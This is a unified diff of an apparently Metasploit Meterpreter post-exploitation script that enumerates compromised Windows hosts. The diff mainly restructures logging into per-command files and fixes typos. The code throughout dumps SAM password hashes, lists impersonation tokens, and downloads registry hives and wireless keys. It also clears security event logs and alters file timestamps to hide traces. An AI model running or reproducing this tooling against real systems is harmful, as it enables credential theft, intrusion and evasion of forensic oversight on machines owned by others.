@@ -1,14 +1,5 @@
 # $Id$
-#
-#Meterpreter script for basic enumeration of Windows 2000, Windows 2003, Windows Vista
-# and Windows XP targets using native windows commands.
-#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.3.5
-#Note: Compleatly re-writen to make it modular and better error handling.
-#      Working on adding more Virtual Machine Checks and looking at improving
-#      the code but retain the independance of each module so it is easier for
-#      the code to be re-used.
-#Contributor: natron (natron 0x40 invisibledenizen 0x2E com) (Process Migration Functions)
+
 ################## Variable Declarations ##################
 @client = client
 opts = Rex::Parser::Arguments.new(
@@ -50,12 +41,12 @@ filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(
 
 # Create a directory for the logs
 logs = ::File.join(Msf::Config.log_directory, 'winenum', info['Computer'] + filenameinfo )
-
+@logfol = logs
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
 
-#logfile name
-dest = logs + "/" + info['Computer'] + filenameinfo + ".txt"
+#log file name
+@dest = logs + "/" + info['Computer'] + filenameinfo + ".txt"
 
 # Commands that will be ran on the Target
 commands = [
@@ -89,7 +80,7 @@ win2k8cmd = [
 	'servermanagercmd.exe -q',
 	'cscript /nologo winrm get winrm/config',
 ]
-# Commands wich MACE will be changed
+# Commands that MACE will be changed
 cmdstomp = [
 	'cmd.exe',
 	'reg.exe',
@@ -193,7 +184,6 @@ def findprogs()
 					rescue
 					end
 					proglist << "#{dispnm}\t#{dispversion}\n" if dispnm =~ /[a-z]/
-
 				})
 			threadnum += 1
 		else
@@ -202,7 +192,7 @@ def findprogs()
 		end
 
 	end
-	return proglist
+	filewrt("#{@logfol}/programs_list.txt",proglist)
 end
 # Function to check if Target Machine a VM
 # Note: will add soon Hyper-v and Citrix Xen check.
@@ -228,7 +218,6 @@ def chkvm()
 			check = 1
 		end
 	rescue
-		print_status("BIOS Check Failed")
 
 	end
 	if check != 1
@@ -254,80 +243,62 @@ def chkvm()
 				vmout << "This is a Hyper-v/Virtual Server virtual Machine\n\n"
 			end
 		rescue::Exception => e
-			print_status("#{e.class} #{e}")
 		end
 	end
 	vmout
 end
 #-------------------------------------------------------------------------------
-# Function for running a list a commands stored in a array, returs string
+# Function for running a list a commands stored in a array, return string
 def list_exec(cmdlst)
 	print_status("Running Command List ...")
-	tmpout = ""
-	cmdout = ""
-	r=''
 	i = 0
 	a =[]
 	@client.response_timeout=120
 	cmdlst.each do |cmd|
-
 		if i < 10
 			a.push(::Thread.new {
-
+					r,cmdout='',""
 					print_status "\trunning command #{cmd}"
-					tmpout = ""
-					tmpout << "*****************************************\n"
-					tmpout << "      Output of #{cmd}\n"
-					tmpout << "*****************************************\n"
 					r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
 					while(d = r.channel.read)
-
-						tmpout << d
+						cmdout << d
+						filewrt("#{@logfol}/#{cmd.gsub(/(\W)/,"_")}.txt",cmdout)
 					end
-					filewrt(@report,tmpout)
-					tmpout = nil
+					cmdout = ""
 					r.channel.close
 					r.close
-
 				})
 			i += 1
+			
+
 		else
-			sleep(0.01) and a.delete_if {|x| not x.alive?} while not a.empty?
+			sleep(0.10) and a.delete_if {|x| not x.alive?} while not a.empty?
 			i = 0
 		end
 	end
+	
 	a.delete_if {|x| not x.alive?} while not a.empty?
-
 end
 #-------------------------------------------------------------------------------
-# Function for running a list of WMIC commands stored in a array, returs string
+# Function for running a list of WMIC commands stored in a array, returns string
 def wmicexec(wmiccmds= nil)
 	print_status("Running WMIC Commands ....")
-	tmpout = ''
 	i, a = 0, []
-	output_files = []
 	@client.response_timeout=120
 
 	begin
 		tmp = @client.fs.file.expand_path("%TEMP%")
 
 		wmiccmds.each do |wmi|
-			wmicfl = tmp + "\\#{sprintf("%.5d",rand(100000))}.txt"
-			output_files << "#{wmicfl}"
 			if i < 10
 				a.push(::Thread.new {
+						tmpout = ''
+						wmicfl = tmp + "\\#{sprintf("%.5d",rand(100000))}.txt"
 						print_status "\trunning command wmic #{wmi}"
-						r = @client.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
-						sleep(1)
-						r = @client.sys.process.execute("cmd.exe /c echo      Output of wmic #{wmi} >> #{wmicfl}",nil, {'Hidden' => 'true'})
-						sleep(1)
-						r = @client.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
-						sleep(1)
+						flname = "#{@logfol}/wmic_#{wmi.gsub(/(\W)/,"_")}.txt"
 						r = @client.sys.process.execute("cmd.exe /c wmic /append:#{wmicfl} #{wmi}", nil, {'Hidden' => true})
-						sleep(2)
-
-						
-						#Making sure that wmic finnishes before executing next wmic command
+						sleep(2)						
+						#Making sure that WMIC finishes before executing next WMIC command
 						prog2check = "wmic.exe"
 						found = 0
 						while found == 0
@@ -340,6 +311,20 @@ def wmicexec(wmiccmds= nil)
 							end
 						end
 						r.close
+						# Read output of WMIC
+						wmioutfile = @client.fs.file.new(wmicfl, "rb")
+						until wmioutfile.eof?
+							tmpout << wmioutfile.read
+						end
+						wmioutfile.close
+						# Create file with output of command
+						filewrt(flname,tmpout)
+						# Delete created file on disk
+						begin
+							@client.fs.file.rm(wmicfl)
+						rescue
+						end
+
 					})
 				i += 1
 			else
@@ -352,30 +337,6 @@ def wmicexec(wmiccmds= nil)
 	rescue ::Exception => e
 		print_status("Error running WMIC commands: #{e.class} #{e}")
 	end
-
-	#print_status("Waiting for WMIC to finnish running all commands.......")
-	
-	print_status("\tReading all output of WMIC commands...")
-	output_files.each do |of|
-		begin
-			# Read the output file of the wmic commands
-			wmioutfile = @client.fs.file.new(of, "rb")
-			until wmioutfile.eof?
-				tmpout << wmioutfile.read
-			end
-			wmioutfile.close
-		rescue
-		end
-	end
-	# We delete the file with the wmic command output.
-	print_status("\tCleanning left over files...")
-	output_files.each do |of|
-		begin
-			@client.fs.file.rm(of)
-		rescue
-		end
-	end
-	tmpout
 end
 #-------------------------------------------------------------------------------
 #Function for getting the NTLM and LANMAN hashes out of a system
@@ -385,9 +346,6 @@ def gethash()
 		hash = ''
 		@client.core.use("priv")
 		hashes = @client.priv.sam_hashes
-		hash << "****************************\n"
-		hash << "  Dumped Password Hashes\n"
-		hash << "****************************\n\n"
 		hashes.each do |h|
 			hash << h.to_s+"\n"
 		end
@@ -397,11 +355,12 @@ def gethash()
 		print_status("\tError dumping hashes: #{e.class} #{e}")
 		print_status("\tPayload may be running with insuficient privileges!")
 	end
-	hash
+	flname = "#{@logfol}/hashdump.txt"
+	filewrt(flname,hash)
 
 end
 #-------------------------------------------------------------------------------
-#Function that uses the incognito fetures to list tokens on the system that can be used
+#Function that uses the incognito features to list tokens on the system that can be used
 def listtokens()
 	begin
 		print_status("Getting Tokens...")
@@ -439,11 +398,10 @@ def listtokens()
 	rescue ::Exception => e
 		print_status("Error Getting Tokens: #{e.class} #{e}")
 	end
-	dt
-
+	filewrt("#{@logfol}/tokens.txt",dt)
 end
 #-------------------------------------------------------------------------------
-# Function for clearing all eventlogs
+# Function for clearing all event logs
 def clrevtlgs()
 	evtlogs = [
 		'security',
@@ -459,8 +417,9 @@ def clrevtlgs()
 			print_status("\tClearing the #{evl} Event Log")
 			log = @client.sys.eventlog.open(evl)
 			log.clear
+			filewrt(@dest,"Cleared the #{evl} Event Log")
 		end
-		print_status("Alll Event Logs have been cleared")
+		print_status("All Event Logs have been cleared")
 	rescue ::Exception => e
 		print_status("Error clearing Event Log: #{e.class} #{e}")
 
@@ -471,7 +430,6 @@ end
 # The files have to be in %WinDir%\System32 folder.
 def chmace(cmds)
 	windir = ''
-	windrtmp = ""
 	print_status("Changing Access Time, Modified Time and Created Time of Files Used")
 	windir = @client.fs.file.expand_path("%WinDir%")
 	cmds.each do |c|
@@ -481,7 +439,7 @@ def chmace(cmds)
 			fl2clone = windir + "\\system32\\chkdsk.exe"
 			print_status("\tChanging file MACE attributes on #{filetostomp}")
 			@client.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)
-
+			filewrt(@dest,"Changed MACE of #{filetostomp}")
 		rescue ::Exception => e
 			print_status("Error changing MACE: #{e.class} #{e}")
 		end
@@ -513,15 +471,17 @@ def regdump(pathoflogs,filename)
 			end
 			r.channel.close
 			r.close
+
 		rescue ::Exception => e
 			print_status("Error dumping Registry Hives #{e.class} #{e}")
 		end
 	end
-	#Downloading Compresed registry Hives
+	#Downloading compressed registry Hives
 	hives.each_line do |hive|
 		begin
 			print_status("\tDownloading #{hive}#{filename}.cab to -> #{pathoflogs}/#{host}-#{hive}#{filename}.cab")
 			@client.fs.file.download_file("#{pathoflogs}/#{host}-#{hive}#{filename}.cab", "#{windir}\\Temp\\#{hive}#{filename}.cab")
+			filewrt(@dest,"Dumped and Downloaded #{hive} Registry Hive")
 			sleep(5)
 		rescue ::Exception => e
 			print_status("Error Downloading Registry Hives #{e.class} #{e}")
@@ -549,30 +509,28 @@ end
 def filewrt(file2wrt, data2wrt)
 	output = ::File.open(file2wrt, "a")
 	if data2wrt
-	data2wrt.each_line do |d|
-		output.puts(d)
-	end
+		data2wrt.each_line do |d|
+			output.puts(d)
+		end
 	end
 	output.close
 end
 #-------------------------------------------------------------------------------
 
 # Function for dumping Registry keys that contain wireless configuration settings for Vista and XP 
-# This keys can later be imported into a Windows client for conection or key extraction.
+# This keys can later be imported into a Windows client for connection or key extraction.
 def dumpwlankeys(pathoflogs,filename)
-	host,port = @client.tunnel_peer.split(':')
 	#This variable will only contain garbage, it is to make sure that the channel is not closed while the reg is being dumped and compress
 	garbage = ''
-	windrtmp = ''
 	windir = @client.fs.file.expand_path("%TEMP%")
 	print_status('Dumping and Downloading the Registry entries for Configured Wireless Networks')
 	xpwlan = "HKLM\\Software\\Microsoft\\WZCSVC\\Parameters\\Interfaces"
 	vswlan = "HKLM\\Software\\Microsoft\\Wlansvc"
 	info = @client.sys.config.sysinfo
 	trgtos = info['OS']
-	if trgtos =~ /(Windows XP)/
+	if trgtos =~ /(XP)/
 		key = xpwlan
-	elsif trgtos =~ /(Windows Vista)/
+	elsif trgtos =~ /(Vista)/
 		key = vswlan
 	end
 	begin
@@ -595,7 +553,7 @@ def dumpwlankeys(pathoflogs,filename)
 		print_status("Error dumping Registry keys #{e.class} #{e}")
 	end
 
-	#Downloading Compresed registry keys
+	#Downloading compressed registry keys
 	
 	begin
 		print_status("\tDownloading wlan#{filename}.cab to -> #{pathoflogs}/wlan#{filename}.cab")
@@ -675,7 +633,7 @@ end
 def uaccheck()
 	uac = false
 	winversion = @client.sys.config.sysinfo
-	if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
+	if winversion['OS']=~ /(Vista|7)/
 		if @client.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
 			print_status("Checking if UAC is enabled ...")
 			key = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
@@ -691,6 +649,7 @@ def uaccheck()
 			end
 		end
 	end
+	filewrt(@dest,"UAC is Enabled")
 	return uac
 end
 ################## MAIN ##################
@@ -700,7 +659,7 @@ if (mg != nil)
 	migrate()
 end
 # Main part of script, it will run all function minus the ones
-# that will chance the MACE and Clear the Eventlog.
+# that will chance the MACE and Clear the Event log.
 print_status("Running Windows Local Enumerion Meterpreter Script")
 print_status("New session on #{host}:#{port}...")
 
@@ -711,37 +670,40 @@ header << "Running as: #{@client.sys.config.getuid}\n"
 header << "Host:       #{info['Computer']}\n"
 header << "OS:         #{info['OS']}\n"
 header << "\n\n\n"
-@report = dest
-print_status("Saving report to #{dest}")
-filewrt(dest,header)
-filewrt(dest,chkvm())
+print_status("Saving report to #{@dest}")
+filewrt(@dest,header)
+filewrt(@dest,chkvm())
 trgtos = info['OS']
 uac = uaccheck()
 # Run Commands according to OS some commands are not available on all versions of Windows
 if trgtos =~ /(Windows XP)/
+	if trgtos =~ /(2600, \)|2600, Service Pack 1\))/
+		commands.delete('netstat -vb')
+		commands.delete('netsh firewall show config')
+	end
 	list_exec(commands)
-	filewrt(dest,wmicexec(wmic))
-	filewrt(dest,findprogs())
+	wmicexec(wmic)
+	findprogs()
 	dumpwlankeys(logs,filenameinfo)
-	filewrt(dest,gethash())
+	gethash()
 elsif trgtos =~ /(Windows .NET)/
 	list_exec(commands)
-	filewrt(dest,wmicexec(wmic))
-	filewrt(dest,findprogs())
-	filewrt(dest,gethash())
+	wmicexec(wmic)
+	findprogs()
+	gethash()
 elsif trgtos =~ /(Windows 2008)/
 	list_exec(commands + win2k8cmd)
-	filewrt(dest,wmicexec(wmic))
-	filewrt(dest,findprogs())
+	wmicexec(wmic)
+	findprogs()
 	if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
 		print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows 2008 if not System.")
 	else
-		filewrt(dest,gethash())
+		gethash()
 	end
-elsif trgtos =~ /(Windows Vista)/ or trgtos =~ /(Windows 7)/
-	filewrt(dest,list_exec(commands + vstwlancmd))
-	filewrt(dest,wmicexec(wmic))
-	filewrt(dest,findprogs())
+elsif trgtos =~ /(Vista|7)/
+	list_exec(commands + vstwlancmd)
+	wmicexec(wmic)
+	findprogs()
 	if not uac
 		dumpwlankeys(logs,filenameinfo)
 	else
@@ -750,24 +712,22 @@ elsif trgtos =~ /(Windows Vista)/ or trgtos =~ /(Windows 7)/
 	if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
 		print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows Vista or Windows 7 if not System.")
 	else
-		filewrt(dest,gethash())
+		gethash()
 	end
 elsif trgtos =~ /(Windows 2000)/
-	filewrt(dest,list_exec(commands - nonwin2kcmd))
-	filewrt(dest,gethash())
+	list_exec(commands - nonwin2kcmd)
+	gethash()
 end
 
-filewrt(dest,listtokens())
+listtokens()
 if (rd != nil)
 	if not uac
 		regdump(logs,filenameinfo)
-		filewrt(dest,"Registry was dumped and downloaded")
 	else
 		print_status("UAC is enabled, Registry Keys could not be dumped under current privileges")
 	end
 end
 if (cm != nil)
-	filewrt(dest,"EventLogs where Cleared")
 	if trgtos =~ /(Windows 2000)/
 		covertracks(cmdstomp - nowin2kexe)
 	else
